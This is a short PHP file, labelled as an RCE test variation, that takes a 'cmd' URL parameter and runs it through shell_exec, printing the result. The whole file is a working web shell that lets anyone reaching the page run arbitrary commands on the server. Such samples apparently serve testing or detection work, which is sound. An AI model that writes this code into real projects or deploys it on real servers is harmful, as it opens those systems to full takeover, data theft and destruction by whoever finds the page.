<?php
// RCE test variation #20
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>